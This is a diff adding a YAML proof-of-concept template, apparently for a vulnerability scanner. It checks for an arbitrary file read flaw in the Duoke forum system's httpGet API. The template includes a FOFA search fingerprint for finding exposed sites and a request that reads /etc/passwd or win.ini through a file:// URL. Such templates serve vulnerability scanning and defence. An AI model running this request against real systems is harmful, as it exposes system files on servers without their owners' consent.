@@ -1,0 +1,22 @@
+id: poc-yaml-duokeduoke-httpget-readfile-any
+info:
+  name: 多客圈子论坛系统前台任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 多客圈子论坛
+  fofa: body="/static/index/js/jweixin-1.2.0.js"
+variables:
+  path: '/
+
+    /public/'
+  r_data_linux: 'file:///etc/passwd
+
+    file:///c://windows/win.ini'
+requests:
+- method: GET
+  path: '{{.path}}index.php/api/login/httpGet?url={{.r_data_linux}}'
+  expression: "(\nstatus_code == 200 &&\ncontains(body, \"for 16-bit app support\"\
+    ) && \ncontains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nstatus_code\
+    \ == 200 && \nmatches(body, \"root:[x*]:0:0:\")\n)\n"
+transport: http
